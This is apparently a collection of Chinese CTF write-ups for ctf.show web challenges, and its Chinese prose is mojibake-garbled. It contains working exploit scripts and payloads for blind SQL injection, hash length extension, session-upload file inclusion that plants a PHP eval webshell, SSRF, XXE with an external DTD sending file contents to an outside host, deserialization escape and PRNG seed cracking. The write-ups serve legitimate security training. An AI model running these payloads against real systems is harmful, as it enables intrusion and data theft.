è¯•äº†è¯•ï¼Œæœç„¶æ˜¯ï¼Œä¸è¿‡æ‰§è¡Œå‘½ä»¤æ—¶æœ‰æ—¶å€™ä¼šä¸æˆåŠŸï¼Œflagåœ¨ç½‘ç«™ç›®å½• web5ç™»é™†å°±æœ‰flag_å†…éƒ¨èµ›è²Œä¼¼ä¸‡èƒ½å¯†ç é¢˜ï¼Œéšä¾¿åŠ ä¸ªä¸œè¥¿å‘ç°æç¤ºå¤ªé•¿äº†ï¼Œåº”è¯¥æ˜¯é•¿åº¦é™åˆ¶ï¼Œç›´æ¥ä¸‹é¢éƒ½è¡Œï¼š 1234u&#x3D;&#39;^&#39;&#39;#&amp;p&#x3D;1u&#x3D;&#39;^0#&amp;p&#x3D;1u&#x3D;&#39;%260#&amp;p&#x3D;1u&#x3D;&#39;%261#&amp;p&#x3D;1 web6ç­¾é€€å†…éƒ¨èµ›æºç ï¼š 1&lt;?php ($S = $_GET[&#x27;S&#x27;])?eval(&quot;$$S&quot;):highlight_file(__FILE__); payload: 1?S&#x3D;&#123;system(&#39;cat ..&#x2F;..&#x2F;flag.txt&#39;)&#125;; web2_è§‚æ˜Ÿè¿‡æ»¤äº†ï¼š 1, ascii ç©ºæ ¼ &#x3D; like and payload: 1(case/**/when/**/ord(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/in/**/(0x77656231)/**/%26%26/**/table_name/**/in/**/(0x666c6167))/**/from/**/1/**/for/**/1))&lt;100/**/then/**/1/**/else/**/0/**/end)# æœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ï¼š andè¿‡æ»¤ç”¨&amp;&amp;éœ€è¦urlç¼–ç  ç­‰äºå·è¿‡æ»¤ç”¨in,è¦åŠ æ‹¬å·ï¼Œè¿˜å¯ä»¥ç”¨åŒæ—¶ä¸æ»¡è¶³å¤§äºå°äºä¸¤ä¸ªæ¡ä»¶ å•å¼•å·è¿‡æ»¤ç”¨åå…­è¿›åˆ¶ ,è¿‡æ»¤ç”¨from...for exp: 1234567891011121314151617181920212223242526272829303132333435363738import requestsurl=&quot;http://196a9ac5-2082-4530-8ae1-6a72f276e86b.chall.ctf.show/index.php?id=&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 f=1 midflag=1 mid=0 while f and midflag!=mid: f=0 midflag=mid mid=(top+low)//2 p1=&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&lt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;.format(str(i),str(mid)) p2=&quot;(case/**/when/**/ord(substr((select/**/flag/**/from/**/flag)/**/from/**/&#123;&#125;/**/for/**/1))&gt;&#123;&#125;/**/then/**/1/**/else/**/0/**/end)#&quot;.format(str(i),str(mid)) try: print(i,mid) r1=requests.get(url+p1) if &#x27;pitch-and-toss,&#x27; in r1.text: top=mid-1 f=1 else: low=mid+1 r2=requests.get(url+p2) if &#x27;pitch-and-toss,&#x27; in r2.text: low=mid+1 f=1 else: top=mid-1 except Exception as e: pass if f==0: flag+=chr(mid) print(flag) if flag==f1: break easyshell_36Dç»ƒæ‰‹èµ›æ˜æ˜¾hashé•¿åº¦æ‰©å±•æ”»å‡» 12345678910111213141516171819import hashpumpyimport urllibimport requestsurl=&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/?&#x27;hsh=&#x27;fc77c20ed2841d8162335eaebb2f3c09&#x27;s1=&#x27;&#x27;&#x27;1&#x27;&#x27;&#x27;s2=&#x27;&#x27;&#x27;admin&#x27;&#x27;&#x27;for i in range(300): m=hashpumpy.hashpump(hsh,s1,s2,i) #print i name=urllib.quote(urllib.unquote(m[1])) uri=url+&#x27;name=&#x27;+name+&quot;&amp;pass=&quot;+m[0] #print uri r=requests.get(uri) # print r.text if &quot;error&quot; not in r.text: print r.text; break å¾—åˆ°flflflflag.phpï¼Œè®¿é—®ä¼šè·³è½¬ï¼ŒæŠ“åŒ…åœ¨æºç é‡Œå‘ç°ï¼š 1include($_GET[&quot;file&quot;]) å°è¯•åŒ…å«sessionä¸Šä¼ è¿›åº¦getshell 123456789101112131415161718192021222324252627282930import requestsimport threadingurl=&#x27;http://7270896d-ae34-4a8f-893e-287f6e5a21cc.chall.ctf.show/flflflflag.php&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶ &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\\&#x27;&lt;?php @eval($_POST[1]);?&gt;\\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27; &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(url+&quot;?file=/tmp/sess_dddd&quot;) if &#x27;moonback&#x27; in t.text: # print(&#x27;[+]retry&#x27;) print(&#x27;success&#x27;) else: passfor i in range(50): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() èšå‰‘è¿ä¸Šbypass disable_function,flagåœ¨ç¯å¢ƒå˜é‡é‡Œï¼Œè¿™é¢˜å°±æ˜¯NPUCTFåŸé¢˜ è´´ä¸€ä¸‹æºç ï¼š 1234567891011121314151617&lt;?phpinclude &#x27;config.php&#x27;;@$name=$_GET[&#x27;name&#x27;];@$pass=$_GET[&#x27;pass&#x27;];if(md5($secret.$name)===$pass)&#123; echo &#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt; window.location.href=&quot;flflflflag.php&quot;; &lt;/script&gt;&#x27;;&#125;else&#123; setcookie(&quot;Hash&quot;,md5($secret.$name),time()+3600000); echo &quot;username/password error&quot;;&#125;?&gt;&lt;html&gt;&lt;!--md5($secret.$name)===$pass --&gt;&lt;/html&gt; CTFshow web1game-gyctf web2æ‰«ç›®å½•å‘ç°www.zipï¼Œä¸»è¦ä»£ç éƒ½åœ¨lib.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120&lt;?phperror_reporting(0);session_start();function safe($parm)&#123; $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\\\&#x27;,&quot;*&quot;,&quot;alter&quot;); return str_replace($array,&#x27;hacker&#x27;,$parm);&#125;class User&#123; public $id; public $age=null; public $nickname=null; public function login() &#123; if(isset($_POST[&#x27;username&#x27;])&amp;&amp;isset($_POST[&#x27;password&#x27;]))&#123; $mysqli=new dbCtrl(); $this-&gt;id=$mysqli-&gt;login(&#x27;select id,password from user where username=?&#x27;); if($this-&gt;id)&#123; $_SESSION[&#x27;id&#x27;]=$this-&gt;id; $_SESSION[&#x27;login&#x27;]=1; echo &quot;ä½ çš„IDæ˜¯&quot;.$_SESSION[&#x27;id&#x27;]; echo &quot;ä½ å¥½ï¼&quot;.$_SESSION[&#x27;token&#x27;]; echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;; return $this-&gt;id; &#125; &#125;&#125; public function update()&#123; $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]); //è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘ &#125; public function getNewInfo()&#123; $age=$_POST[&#x27;age&#x27;]; $nickname=$_POST[&#x27;nickname&#x27;]; return safe(serialize(new Info($age,$nickname))); &#125; public function __destruct()&#123; return file_get_contents($this-&gt;nickname);//å± &#125; public function __toString() &#123; $this-&gt;nickname-&gt;update($this-&gt;age); return &quot;0-0&quot;; &#125;&#125;class Info&#123; public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname)&#123; $this-&gt;age=$age; $this-&gt;nickname=$nickname; &#125; public function __call($name,$argument)&#123; echo $this-&gt;CtrlCase-&gt;login($argument[0]); &#125; &#125;Class UpdateHelper&#123; public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql)&#123; $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); &#125; public function __destruct() &#123; echo $this-&gt;sql; &#125;&#125;class dbCtrl&#123; public $hostname=&quot;127.0.0.1&quot;; public $dbuser=&quot;noob123&quot;; public $dbpass=&quot;noob123&quot;; public $database=&quot;noob123&quot;; public $name; public $password; public $mysqli; public $token; public function __construct() &#123; $this-&gt;name=$_POST[&#x27;username&#x27;]; $this-&gt;password=$_POST[&#x27;password&#x27;]; $this-&gt;token=$_SESSION[&#x27;token&#x27;]; &#125; public function login($sql) &#123; $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database); if ($this-&gt;mysqli-&gt;connect_error) &#123; die(&quot;è¿æ¥å¤±è´¥ï¼Œé”™è¯¯:&quot; . $this-&gt;mysqli-&gt;connect_error); &#125; $result=$this-&gt;mysqli-&gt;prepare($sql); $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name); $result-&gt;execute(); $result-&gt;bind_result($idResult, $passwordResult); $result-&gt;fetch(); $result-&gt;close(); if ($this-&gt;token==&#x27;admin&#x27;) &#123; return $idResult; &#125; if (!$idResult) &#123; echo(&#x27;ç”¨æˆ·ä¸å­˜åœ¨!&#x27;); return false; &#125; if (md5($this-&gt;password)!==$passwordResult) &#123; echo(&#x27;å¯†ç é”™è¯¯ï¼&#x27;); return false; &#125; $_SESSION[&#x27;token&#x27;]=$this-&gt;name; return $idResult; &#125; public function update($sql) &#123; //è¿˜æ²¡æ¥å¾—åŠå†™ &#125;&#125; å…ˆçœ‹ä¸‹ååºåˆ—åŒ–é“¾ï¼š 1UpdateHelper::__destruct() &#x3D;&#x3D;&gt; User::__toString() &#x3D;&#x3D;&gt; Info::__call() &#x3D;&#x3D;&gt; web1è§‚å­—WEB_AKèµ›æºç ï¼š 1234567891011121314&lt;?php#flag in http://192.168.7.68/flagif(isset($_GET[&#x27;url&#x27;]))&#123; $url = $_GET[&#x27;url&#x27;]; $protocol = substr($url, 0,7); if($protocol!=&#x27;http://&#x27;)&#123; die(&#x27;ä»…é™httpåè®®è®¿é—®&#x27;); &#125; if(preg_match(&#x27;/\\.|\\;|\\||\\&lt;|\\&gt;|\\*|\\%|\\^|\\(|\\)|\\#|\\@|\\!|\\`|\\~|\\+|\\&#x27;|\\&quot;|\\.|\\,|\\?|\\[|\\]|\\&#123;|\\&#125;|\\!|\\&amp;|\\$|0/&#x27;, $url))&#123; die(&#x27;ä»…é™åŸŸååœ°å€è®¿é—®&#x27;); &#125; system(&#x27;curl &#x27;.$url);&#125; è¿‡æ»¤äº†ä¸€å¤§å †ä¸œè¥¿ï¼Œç›´æ¥ä¸­æ–‡å¥å·ç»•è¿‡ã€‚ï¼Œpayload: 1?url&#x3D;http:&#x2F;&#x2F;192ã€‚168ã€‚7ã€‚68&#x2F;flag web3è§‚å›¾WEB_AKèµ›æŸ¥çœ‹æºç å‘ç°ï¼š 1showImage.php?image&#x3D;Z6Ilu83MIDw&#x3D; å°†imageæ”¹æˆimage[]=æŠ¥é”™ï¼š 1Warning: openssl_decrypt() expects parameter 1 to be string, array given in &#x2F;var&#x2F;www&#x2F;html&#x2F;showImage.php on line 8 ç›´æ¥è®¿é—®showImage.phpä¼šæœ‰æºç ï¼š 12345678910111213141516 &lt;?php//$key = substr(md5(&#x27;ctfshow&#x27;.rand()),3,8);//flag in config.phpinclude(&#x27;config.php&#x27;);if(isset($_GET[&#x27;image&#x27;]))&#123; $image=$_GET[&#x27;image&#x27;]; $str = openssl_decrypt($image, &#x27;bf-ecb&#x27;, $key); if(file_exists($str))&#123; header(&#x27;content-type:image/gif&#x27;); echo file_get_contents($str); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; çˆ†ç ´keyå§ï¼Œè„šæœ¬ï¼š 1234567891011121314&lt;?php$image &#x3D; &quot;Z6Ilu83MIDw&#x3D;&quot;;for($i&#x3D;0;$i&lt;100000;$i++)&#123; $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8); $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key); if(strpos($str,&#39;jpg&#39;)||strpos($str,&#39;png&#39;)||strpos($str,&#39;gif&#39;))&#123; echo &#39;key:&#39;.$key; echo &quot;\\nrand():&quot;.$i; $a &#x3D; openssl_encrypt(&quot;config.php&quot;,&quot;bf-ecb&quot;,$key); echo &quot;\\nanser:&quot;.$a; echo &quot;\\nfile:&quot;.$str; break; &#125;&#125; web4è§‚å¿ƒWEB_AKèµ›åœ¨js/common.jsé‡Œçœ‹åˆ°api.phpï¼Œå åœæŠ“åŒ…å‘ç° è²Œä¼¼æ˜¯xxe,æ— å›æ˜¾çš„ï¼ŒçŒœæµ‹ç›´æ¥ç”¨file_get_contentså¾—åˆ°xmlæ–‡ä»¶çš„ æœåŠ¡ç«¯çš„xml: 12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://1.1.1.1/test.dtd&quot;&gt;%remote;%int;%send;]&gt; test.dtd: 12&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;1.1.1.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt; ç­¾åˆ°è§‚å·±WEB_AKèµ›æºç ï¼š 123456789101112131415&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&#x27;/php/i&#x27;, $file))&#123; die(&#x27;error&#x27;); &#125;else&#123; include($file); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; ç›´æ¥åŒ…å«ä¸Šä¼ è¿›åº¦è¿›åº¦å°±è¡Œï¼š 1234567891011121314151617181920212223242526272829import requestsimport threadingimport sysurl=&#x27;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=mb&#x27;&#125;def POST(): files=&#123; &quot;upload&quot;:&#x27;&#x27; #ä¸Šä¼ æ— æ•ˆçš„ç©ºæ–‡ä»¶ &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php echo &quot;moonback&quot;;file_put_contents(&quot;/tmp/mb&quot;, base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWzFdKTs=&quot;));?&gt;&#x27; #æ¶æ„è¿›åº¦ä¿¡æ¯ï¼Œreadfileå°†ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ &#125; r.post(url,files=files,headers=headers,data=data)def READ(): # event.wait() while True: POST() t=r.get(&quot;http://87938f25-72e4-4941-a5a5-c9bbdf65dbe6.chall.ctf.show/?file=/tmp/sess_mb&quot;) if &#x27;moonback&#x27; in t.text: print(&#x27;[+] success&#x27;) breakfor i in range(50): threading.Thread(target=READ,args=()).start() æˆ–è€…åŒ…å«æ—¥å¿—: 123&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log å…ˆåŒ…å«æ—¥å¿—é…ç½®æ–‡ä»¶æŸ¥çœ‹logæ–‡ä»¶ä½ç½®ï¼Œåªéœ€åœ¨user-agentä¸­åŠ å…¥ä¸€å¥è¯å°±è¡Œ webå…¥é—¨web11æç¤ºåŸŸåä¹Ÿå¯ä»¥éšè—ä¿¡æ¯ï¼Œç«‹é©¬æƒ³åˆ°äº†txtè®°å½•ï¼Œç›´æ¥nslookup web12æç¤ºé¡µé¢ä¸­çš„ä¿¡æ¯æ˜¯å¯†ç ï¼Œå‘ç°æœ‰ä¸ªæ‰‹æœºå·ï¼Œå¯†ç åˆšå¥½ä¸ºè¿™ 1admin:372619038 web13æŸ¥çœ‹æºç å‘ç°document.pdfï¼Œä¸‹è½½ä¸‹æ¥æ‰¾åˆ°åå°ä¸º 12&#x2F;system1103&#x2F;login.phpé»˜è®¤è´¦å·å¯†ç ï¼šadmin:admin1103 web14æŸ¥çœ‹æºç å‘ç°/editor/è·¯å¾„ï¼Œè®¿é—®æŸ¥çœ‹æºç å‘ç°æ˜¯KindEditorï¼Œç›´æ¥åœ¨æ–‡ä»¶ç©ºé—´æ‰¾åˆ°flagçš„è·¯å¾„ä¸º 1&#x2F;nothinghere&#x2F;fl000g.txt web15ç¤¾å·¥é¢˜ï¼Œé¦–é¡µæš´éœ²çš„é‚®ç®±æœäº†ä¸‹qqå‘ç°å±…ä½é™•è¥¿è¥¿å®‰ï¼Œ/adminæˆåŠŸé€šè¿‡å¯†ä¿é—®é¢˜é‡ç½®å¯†ç  web16æç¤ºæ¢é’ˆï¼Œè®¿é—®tz.phpï¼Œåœ¨phpinfoä¸­æ‰¾åˆ°flag web17ç½‘ç»œç©ºé—´æœç´¢å¼•æ“å°±è¡Œï¼Œzoomeyeç›´æ¥æŸ¥ web18æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jsä¸­æœ‰è°éŸ³ 1ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹ è®¿é—®110.phpå¾—åˆ°flag web19æŸ¥çœ‹æºç å‘ç° 12345678910&lt;?phperror_reporting(0);$flag=&quot;fakeflag&quot;;$u = $_POST[&#x27;username&#x27;];$p = $_POST[&#x27;pazzword&#x27;];if(isset($u) &amp;&amp; isset($p))&#123; if($u===&#x27;admin&#x27; &amp;&amp; $p ===&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;)&#123; echo $flag; &#125;&#125; å¹¶ä¸”å‘ç°åŠ å¯†æ–¹å¼ 123456789101112131415161718192021&lt;script type=&quot;text/javascript&quot;&gt; function checkForm()&#123; var key = &quot;0000000372619038&quot;; var iv = &quot;ilove36dverymuch&quot;; var pazzword = $(&quot;#pazzword&quot;).val(); pazzword = encrypt(pazzword,key,iv); $(&quot;#pazzword&quot;).val(pazzword); $(&quot;#loginForm&quot;).submit(); &#125; function encrypt(data,key,iv) &#123; //key,ivï¼š16ä½çš„å­—ç¬¦ä¸² var key1 = CryptoJS.enc.Latin1.parse(key); var iv1 = CryptoJS.enc.Latin1.parse(iv); return CryptoJS.AES.encrypt(data, key1,&#123; iv : iv1, mode : CryptoJS.mode.CBC, padding : CryptoJS.pad.ZeroPadding &#125;).toString(); &#125;&lt;/script&gt; aesåŠ å¯†ï¼Œç›´æ¥ç”¨CyberChefè§£ï¼Œåé¢çš„ç‚¹æ˜¯å¤šä½™çš„ï¼Œå³å¯†ç ä¸ºi_want_a_36d_girl web20å¾¡å‰‘æ‰«ç›®å½•å‘ç°æœ‰/dbï¼Œæ‰‹æµ‹/db/db.mdbå­˜åœ¨ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œ16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€ï¼Œæœç´¢flag web21ç»™çš„æœ‰å­å…¸ï¼ŒæŠ“åŒ…ï¼Œå‘ç°ç»è¿‡äº†ä¸€å±‚base64åŠ å¯†ï¼Œæ²¡äº‹ï¼Œburpsuiteå¯ä»¥è§£å†³ å¥½åƒä¸èƒ½urlç¼–ç ï¼Œæœ€ç»ˆè·‘å‡ºæ¥ 1admin:shark63 web22å­åŸŸåçˆ†ç ´ï¼Œç›²çŒœflag.ctfer.com web23æºç ï¼š 123456789101112131415 &lt;?phperror_reporting(0);include(&#x27;flag.php&#x27;);if(isset($_GET[&#x27;token&#x27;]))&#123; $token = md5($_GET[&#x27;token&#x27;]); if(substr($token, 1,1)===substr($token, 14,1) &amp;&amp; substr($token, 14,1) ===substr($token, 17,1))&#123; if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))/substr($token, 1,1)===intval(substr($token, 31,1)))&#123; echo $flag; &#125; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; çˆ†ç ´ï¼Œå¯ä»¥çŸ¥é“ï¼Œç¬¬2ä½ï¼Œç¬¬15ä½ï¼Œç¬¬18ä½æ˜¯ä¸€æ ·çš„ï¼Œå¹¶ä¸”ä¸ºæ•°å­—ï¼Œç¬¬32ä½ä¸º3ï¼Œexp: 1234567import hashlibfor i in range(1, 1000000000000000): s = hashlib.md5(str(i).encode()).hexdigest() if s[1]==s[14] and s[14]==s[17] and s[31].isdigit() and s[31]==&#x27;3&#x27;: print(i,s) break web24æºç ï¼š 12345678910111213&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(372619038); if(intval($r)===intval(mt_rand()))&#123; echo $flag; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; ä¼ªéšæœºæ•°ï¼Œç‰ˆæœ¬æ˜¯php7 1234&lt;?phpmt_srand(372619038);echo mt_rand();// 1155388967 web25æºç ï¼š 123456789101112131415161718&lt;?phperror_reporting(0);include(&quot;flag.php&quot;);if(isset($_GET[&#x27;r&#x27;]))&#123; $r = $_GET[&#x27;r&#x27;]; mt_srand(hexdec(substr(md5($flag), 0,8))); $rand = intval($r)-intval(mt_rand()); if((!$rand))&#123; if($_COOKIE[&#x27;token&#x27;]==(mt_rand()+mt_rand()))&#123; echo $flag; &#125; &#125;else&#123; echo $rand; &#125;&#125;else&#123; highlight_file(__FILE__); echo system(&#x27;cat /proc/version&#x27;);&#125; ç›´æ¥php_mt_seedçˆ†ç ´ç§å­ï¼Œç›´æ¥çˆ†ç ´çš„è¯éœ€è¦36*36*36æ¬¡ï¼Œä¸Šä¸‡äº†ï¼Œä¸å¤ªç°å®ï¼Œæ³¨æ„mt_rand()çš„æ¬¡æ•° 1234&lt;?phpmt_srand(117235642);mt_rand();echo (mt_rand()+mt_rand()); web26å°±çˆ†ç ´å®Œäº‹äº†ï¼Œå¯†ç ï¼š7758521 web27å½•å–åå•ä¸‹è½½ä¸‹æ¥list.xlsxï¼Œé‡Œé¢æœ‰å­¦ç”Ÿçš„ä¿¡æ¯ï¼Œæœäº†ä¸‹åå­—ï¼Œæ‰¾åˆ°ï¼šhttps://tools.aizhan.com/rb/idcard.ifanyi.com.cn å…¶å®çˆ†ç ´ä¹Ÿè¡Œ å‚è€ƒï¼š https://www.gem-love.com/ctf/2283.html æœˆé¥¼æ¯web1_æ­¤å¤œåœ†æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435&lt;?phperror_reporting(0);class a&#123; public $uname; public $password; public function __construct($uname,$password) &#123; $this-&gt;uname=$uname; $this-&gt;password=$password; &#125; public function __wakeup() &#123; if($this-&gt;password===&#x27;yu22x&#x27;) &#123; include(&#x27;flag.php&#x27;); echo $flag; &#125; else &#123; echo &#x27;wrong password&#x27;; &#125; &#125; &#125;function filter($string)&#123; return str_replace(&#x27;Firebasky&#x27;,&#x27;Firebaskyup&#x27;,$string);&#125;$uname=$_GET[1];$password=1;$ser=filter(serialize(new a($uname,$password)));$test=unserialize($ser);?&gt; ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸ï¼Œç”±äºæ˜¯å˜é•¿ï¼Œå› æ­¤å¿…é¡»æ·»åŠ &quot;æŠŠå‰é¢çš„é—­åˆäº†ï¼Œåˆ¤æ–­éœ€æ·»åŠ çš„å­—ç¬¦ä¸²ï¼š 1&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; åˆ—æ–¹ç¨‹ï¼š 12311n &#x3D; 9n+ 30 +k&#x2F;&#x2F; n&#x3D;15 k&#x3D;0 æ„é€ payload: 1?1&#x3D;FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; web2_æ•…äººå¿ƒæºç ï¼š 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);highlight_file(__FILE__);$a=$_GET[&#x27;a&#x27;];$b=$_GET[&#x27;b&#x27;];$c=$_GET[&#x27;c&#x27;];$url[1]=$_POST[&#x27;url&#x27;];if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123; $d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c))); if($d)&#123; highlight_file(&#x27;hint.php&#x27;); if(filter_var($url[1],FILTER_VALIDATE_URL))&#123; $host=parse_url($url[1]); print_r($host); if(preg_match(&#x27;/ctfshow\\.com$/&#x27;,$host[&#x27;host&#x27;]))&#123; print_r(file_get_contents($url[1])); &#125;else&#123; echo &#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;; &#125; &#125;else&#123; echo &#x27;please give me url!!!&#x27;; &#125; &#125;else&#123; echo &#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;; &#125;&#125;else&#123; echo &#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;;&#125; ç¬¬ä¸€å…³è¯•å°±å®Œäº‹äº†ï¼ŒçŒœæµ‹æ˜¯ç²¾åº¦é—®é¢˜ï¼Œåæ¥æ‰çŸ¥é“phpå°æ•°ç‚¹åè¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­ï¼Œä½†æ˜¯è¶…è¿‡323ä½åˆä¼šå¤±æ•ˆã€‚ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ä»£æ›¿ï¼Œå³ 1e-162 åˆ° 1e-323 1a&#x3D;1e-300 ç¬¬äºŒå…³md2å¼±æ¯”è¾ƒï¼Œå†™è„šæœ¬è·‘å§ï¼Œrobotsé‡Œæœ‰æç¤º 12xxxxx024452 hash(&quot;md2&quot;,$b)xxxxxx48399 hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b)) è„šæœ¬ï¼š 1234567891011121314151617from Crypto.Hash import MD2def md2(s): obj = MD2.new() obj.update(s.encode()) return obj.hexdigest()def check(id): # print(id) d =&#x27;0e&#x27;+str(id)+&#x27;48399&#x27; enc=md2(md2(d)) if enc[0:2]==&#x27;0e&#x27; and enc[2:-1].isdigit(): print(d) return 1 return 0for i in range(1000,9999): check(i) è·‘å‡ºæ¥ 1b &#x3D; 0e652024452 c &#x3D; 0e603448399 æœ€åä¸€å…³ï¼Œphpä¼šå°†ä¸è®¤è¯†çš„åè®®å½“ä½œç›®å½•ï¼Œpayload: 12?a&#x3D;1e-300&amp;b&#x3D;0e652024452&amp;c&#x3D;0e603448399POST: url&#x3D;a:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd éœ€è¦è·³5å±‚ aä¸€å±‚ ctfshow.comä¸€å±‚ web3_è«è´Ÿå©µå¨ŸæŸ¥çœ‹æºç å‘ç°ï¼š 12&lt;!-- username yu22x --&gt;&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt; fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†ï¼š 1&#39; # \\ % éƒ½è¿‡æ»¤äº†ï¼Œé—­åˆsqlè¯­å¥æ³¨å…¥åº”è¯¥ä¸è¡Œäº†ï¼Œå†çœ‹ä¸‹å‘ç°æ¯”è¾ƒæ—¶æ˜¯likeï¼Œæƒ³åˆ°sqlé€šé…ç¬¦ 123%ï¼šç”¨æ¥è¡¨ç¤ºä»»æ„å¤šä¸ªå­—ç¬¦ï¼Œå¯ä»¥ä¸º0_ : ç”¨æ¥è¡¨ç¤ºä»»æ„å•ä¸ªå­—ç¬¦ å‘ç°å½“æœ‰32ä¸ª_æ—¶çŠ¶æ€æ”¹å˜äº† æˆ‘ä»¬å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸‹å¯†ç  12345678910111213141516171819202122import requestsimport strings = string.ascii_lowercase + string.ascii_uppercase + string.digitsflag = &#x27;&#x27;url = &#x27;http://04c9162c-4824-4247-8d26-743472a723a6.chall.ctf.show/login.php&#x27;for i in range(1,100): f = flag for j in s: print(i,j) p = flag+j+(32-i)*&#x27;_&#x27; data = &#123;&#x27;username&#x27;:&#x27;yu22x&#x27;,&#x27;password&#x27;:p&#125; r = requests.post(url, data=data) if &#x27;wrong&#x27; not in r.text: flag+=j print(flag) break if flag== f: breakprint(flag)# 67815b0c009ee970fe4014abaa3Fa6A0 æ³¨æ„æœ€åä¸€ä½è·‘å‡ºæ¥çš„æ—¶å€™ä¼šç™»å½•æˆåŠŸï¼ŒçŠ¶æ€ä¸ä¸€æ · 